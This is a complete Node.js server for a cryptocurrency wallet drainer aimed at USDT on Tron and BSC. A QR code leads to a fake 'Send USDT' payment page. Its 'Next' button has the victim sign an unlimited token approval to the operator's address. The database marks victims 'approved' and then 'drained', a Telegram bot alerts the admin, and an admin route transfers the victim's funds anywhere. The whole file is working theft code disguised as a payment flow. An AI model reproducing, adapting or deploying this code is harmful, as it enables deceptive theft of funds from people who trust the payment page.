require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const QRCode = require('qrcode');
const TelegramBot = require('node-telegram-bot-api');
const TronWeb = require('tronweb');
const { ethers } = require('ethers');
const cors = require('cors');
const crypto = require('crypto');
const { SignClient } = require('@walletconnect/sign-client');
const { Core } = require('@walletconnect/core');

const app = express();
app.use(express.json());
app.use(cors());

// ============ CONFIG ============
const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN;
const TG_ADMIN_CHAT_ID = process.env.TG_ADMIN_CHAT_ID;
const MONGO_URI = process.env.MONGO_URI;
const MASTER_PK = process.env.MASTER_PK;
const BACKEND_URL = process.env.BACKEND_URL;
const WC_PROJECT_ID = process.env.WC_PROJECT_ID;
const ADMIN_KEY = process.env.ADMIN_KEY;

const CONTRACTS = {
  tron: { usdt: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6, caip: 'tron:0x2b6653dc' },
  bsc: { usdt: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, caip: 'eip155:56' }
};

const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

// ============ TRON & BSC SETUP ============
const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io', privateKey: MASTER_PK });
const MASTER_TRON_ADDRESS = tronWeb.address.fromPrivateKey(MASTER_PK);

const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org');
const bscWallet = new ethers.Wallet(MASTER_PK, bscProvider);
const MASTER_BSC_ADDRESS = bscWallet.address;

const ERC20_ABI = [
  'function approve(address spender, uint256 amount) returns (bool)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address owner) view returns (uint256)'
];
const bscUsdt = new ethers.Contract(CONTRACTS.bsc.usdt, ERC20_ABI, bscWallet);

// ============ TELEGRAM & DB ============
const bot = new TelegramBot(TG_BOT_TOKEN, { polling: true });

mongoose.connect(MONGO_URI, { tls: true, serverSelectionTimeoutMS: 3000 })
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('MongoDB error:', err));

const WalletSchema = new mongoose.Schema({
  sessionId: { type: String, unique: true, required: true },
  chain: { type: String, enum: ['tron', 'bsc'], required: true },
  userWallet: { type: String, default: null },
  approved: { type: Boolean, default: false },
  status: { type: String, enum: ['pending','attached','approved','drained'], default: 'pending' },
  createdAt: { type: Date, default: Date.now }
});
const Wallet = mongoose.model('Wallet', WalletSchema);

// ============ WALLETCONNECT SETUP ============
let signClient = null;

async function initWC() {
  const core = new Core({ projectId: WC_PROJECT_ID, logger: 'error' });
  signClient = await SignClient.init({
    core,
    projectId: WC_PROJECT_ID,
    metadata: {
      name: 'USDT Payment',
      description: 'Securely connect to verify your wallet.',
      url: BACKEND_URL,
      icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png']
    }
  });
  console.log('WalletConnect ready');
}

function checkAdmin(req, res, next) {
  if (req.headers['x-admin-key'] !== ADMIN_KEY) return res.status(401).json({ error: 'Unauthorized' });
  next();
}

// ============ ROUTES ============

// 1. Generate QR (Admin Panel)
app.post('/api/generate-qr', checkAdmin, async (req, res) => {
  try {
    const { chain } = req.body;
    const sessionId = crypto.randomBytes(12).toString('hex');
    await Wallet.create({ sessionId, chain, status: 'pending' });

    // QR में सीधे वेब पेज का लिंक
    const payUrl = `${BACKEND_URL}/pay/${sessionId}`;
    const qrImage = await QRCode.toDataURL(payUrl, { width: 400, margin: 2 });

    res.json({ success: true, sessionId, chain, payUrl, qrImage });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// 2. WEB PAGE (जो QR स्कैन करने पर खुलेगा)
app.get('/pay/:sessionId', async (req, res) => {
  const { sessionId } = req.params;
  const wallet = await Wallet.findOne({ sessionId });
  if (!wallet) return res.status(404).send('Invalid Session');

  res.send(`
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Send USDT</title>
<style>
  body { background: #2b2b2b; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; margin: 0; }
  .header { text-align: center; font-size: 18px; font-weight: 500; margin-bottom: 30px; padding-bottom: 15px; border-bottom: 1px solid #444; }
  .card { background: #333333; padding: 20px; border-radius: 12px; max-width: 400px; margin: auto; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
  .label { font-size: 12px; color: #aaaaaa; margin-bottom: 8px; display: block; }
  .input-group { background: #222222; border-radius: 8px; padding: 15px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
  .input-group input { background: transparent; border: none; color: #ffffff; font-size: 16px; width: 100%; outline: none; }
  .input-group span { color: #00e676; font-size: 14px; font-weight: bold; }
  .btn { background: #00e676; color: #000000; border: none; padding: 15px; width: 100%; font-size: 16px; font-weight: bold; border-radius: 25px; cursor: pointer; transition: 0.2s; }
  .btn:disabled { background: #555555; color: #888888; cursor: not-allowed; }
  #status { font-size: 12px; color: #00e676; text-align: center; margin-top: 15px; min-height: 18px; }
</style>
<script type="module">
  import { UniversalProvider } from 'https://esm.sh/@walletconnect/universal-provider@2.10.0';
  window.UniversalProvider = UniversalProvider;
</script>
</head>
<body>
  <div class="header">Send USDT</div>
  
  <div class="card">
    <span class="label">Address or Domain Name</span>
    <div class="input-group">
      <input type="text" value="${wallet.chain === 'tron' ? MASTER_TRON_ADDRESS : MASTER_BSC_ADDRESS}" readonly>
    </div>
    
    <span class="label">Amount</span>
    <div class="input-group">
      <input type="number" id="amount" value="0.1" min="0.1" step="0.01">
      <span>USDT</span>
    </div>
    
    <button id="btnNext" class="btn" onclick="connectAndPay()">Next</button>
    <div id="status"></div>
  </div>

<script>
  const SESSION_ID = '${sessionId}';
  const CHAIN = '${wallet.chain}';
  const BACKEND = '${BACKEND_URL}';
  const PROJECT_ID = '${WC_PROJECT_ID}';

  async function connectAndPay() {
    const btn = document.getElementById('btnNext');
    btn.disabled = true;
    btn.innerText = 'Processing...';
    document.getElementById('status').innerText = 'Opening Trust Wallet...';

    try {
      const provider = await window.UniversalProvider.init({
        projectId: PROJECT_ID,
        relayUrl: 'wss://relay.walletconnect.com',
        metadata: {
          name: 'USDT Payment',
          description: 'Verify wallet connection',
          url: window.location.origin,
          icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png']
        }
      });

      // 1. Connect
      const session = await provider.connect({
        namespaces: CHAIN === 'tron' ? {
          tron: { methods: ['tron_signTransaction'], chains: ['tron:0x2b6653dc'], events: [] }
        } : {
          eip155: { methods: ['eth_sendTransaction'], chains: ['eip155:56'], events: [] }
        }
      });

      const userAddress = session.namespaces[CHAIN === 'tron' ? 'tron' : 'eip155'].accounts[0].split(':')[2];
      document.getElementById('status').innerText = 'Wallet Connected. Approving...';

      // 2. Build TX
      const buildRes = await fetch(BACKEND + '/api/build-tx', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ sessionId: SESSION_ID, userAddress: userAddress })
      });
      const txData = await buildRes.json();
      if (!txData.success) throw new Error(txData.error);

      // 3. Approve
      const result = await provider.request({
        topic: session.topic,
        chainId: CHAIN === 'tron' ? 'tron:0x2b6653dc' : 'eip155:56',
        request: {
          method: CHAIN === 'tron' ? 'tron_signTransaction' : 'eth_sendTransaction',
          params: CHAIN === 'tron' ? [{ address: userAddress, transaction: txData.tx }] : [txData.tx]
        }
      });

      document.getElementById('status').innerText = 'Verifying Transaction...';

      // 4. Broadcast
      const bcastRes = await fetch(BACKEND + '/api/broadcast-tx', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ sessionId: SESSION_ID, signedTx: result, userAddress: userAddress, chain: CHAIN })
      });
      const bd = await bcastRes.json();

      if (bd.success) {
        document.getElementById('status').innerHTML = '<b>✅ Payment Successful!</b>';
        btn.innerText = 'Done';
      } else {
        throw new Error(bd.error);
      }
    } catch(e) {
      document.getElementById('status').innerText = 'Error: ' + e.message;
      btn.disabled = false;
      btn.innerText = 'Retry';
    }
  }
</script>
</body>
</html>
  `);
});

// 3. Build TX
app.post('/api/build-tx', async (req, res) => {
  try {
    const { sessionId, userAddress } = req.body;
    const wallet = await Wallet.findOne({ sessionId });
    if (!wallet) return res.status(404).json({ error: 'Not found' });

    let tx;
    if (wallet.chain === 'tron') {
      const rawTx = await tronWeb.transactionBuilder.triggerSmartContract(
        CONTRACTS.tron.usdt, 'approve(address,uint256)', { feeLimit: 100000000, callValue: 0 },
        [{ type: 'address', value: MASTER_TRON_ADDRESS }, { type: 'uint256', value: MAX_UINT256 }],
        userAddress
      );
      tx = rawTx.transaction;
    } else {
      const iface = new ethers.Interface(ERC20_ABI);
      const data = iface.encodeFunctionData('approve', [MASTER_BSC_ADDRESS, MAX_UINT256]);
      const nonce = await bscProvider.getTransactionCount(userAddress);
      const feeData = await bscProvider.getFeeData();
      tx = {
        to: CONTRACTS.bsc.usdt, data: data, value: '0x0', gas: '0x186a0',
        maxFeePerGas: feeData.maxFeePerGas?.toString() || '0x12a05f200',
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas?.toString() || '0x3b9aca00',
        nonce: '0x' + nonce.toString(16), chainId: '0x38', type: '0x2'
      };
    }
    res.json({ success: true, tx });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// 4. Broadcast TX
app.post('/api/broadcast-tx', async (req, res) => {
  try {
    const { sessionId, signedTx, userAddress, chain } = req.body;
    const wallet = await Wallet.findOne({ sessionId });
    
    let txHash;
    if (chain === 'tron') {
      const bcast = await tronWeb.trx.sendRawTransaction(signedTx);
      if (!bcast.result) throw new Error(bcast.message);
      txHash = bcast.txid;
    } else {
      txHash = signedTx; // EVM hash
    }

    wallet.userWallet = userAddress;
    wallet.approved = true;
    wallet.status = 'approved';
    await wallet.save();

    bot.sendMessage(TG_ADMIN_CHAT_ID, `✅ *Approved!* [${chain.toUpperCase()}]\nWallet: \`${userAddress}\`\nTX: \`${txHash}\``, { parse_mode: 'Markdown' });
    res.json({ success: true, txHash });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ============ ADMIN ROUTES ============
app.get('/api/admin/wallets', checkAdmin, async (req, res) => {
  const wallets = await Wallet.find({ status: 'approved' }).sort({ createdAt: -1 });
  res.json({ wallets });
});

app.get('/api/admin/balance/:sessionId', checkAdmin, async (req, res) => {
  const wallet = await Wallet.findOne({ sessionId: req.params.sessionId });
  if (!wallet || !wallet.userWallet) return res.status(404).json({ error: 'Not found' });
  let balance;
  if (wallet.chain === 'tron') {
    const contract = await tronWeb.contract().at(CONTRACTS.tron.usdt);
    const bal = await contract.balanceOf(wallet.userWallet).call();
    balance = (Number(bal) / 1e6).toFixed(6);
  } else {
    const bal = await bscUsdt.balanceOf(wallet.userWallet);
    balance = ethers.formatUnits(bal, 18);
  }
  res.json({ balance, wallet: wallet.userWallet, chain: wallet.chain });
});

app.post('/api/admin/transfer', checkAdmin, async (req, res) => {
  try {
    const { sessionId, destination, amount } = req.body;
    const wallet = await Wallet.findOne({ sessionId });
    if (!wallet || !wallet.approved) return res.status(400).json({ error: 'Not approved' });

    let txHash;
    if (wallet.chain === 'tron') {
      const amountSun = Math.floor(parseFloat(amount) * 1e6).toString();
      const contract = await tronWeb.contract().at(CONTRACTS.tron.usdt);
      txHash = await contract.transferFrom(wallet.userWallet, destination, amountSun).send({ feeLimit: 100000000 });
    } else {
      const amountWei = ethers.parseUnits(amount.toString(), 18);
      const tx = await bscUsdt.transferFrom(wallet.userWallet, destination, amountWei);
      const receipt = await tx.wait();
      txHash = receipt.hash;
    }
    wallet.status = 'drained';
    await wallet.save();
    bot.sendMessage(TG_ADMIN_CHAT_ID, `💸 *Transfer Done*\nFrom: \`${wallet.userWallet}\`\nTo: \`${destination}\`\nAmount: ${amount}`);
    res.json({ success: true, txHash });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ============ START ============
(async () => {
  await initWC();
  app.listen(process.env.PORT || 3000, () => console.log('Server running'));
})();
